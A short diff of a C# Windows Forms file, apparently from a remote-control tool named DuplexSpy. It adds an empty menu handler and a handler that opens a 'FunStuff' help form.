@@ -333,5 +333,15 @@ namespace DuplexSpyCS
         {
             SendFun("mouse", "trails");
         }
+
+        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
+
+        private void toolStripMenuItem5_Click(object sender, EventArgs e)
+        {
+            new frmBoxHelper("Function\\FunStuff").Show();
+        }
     }
 }
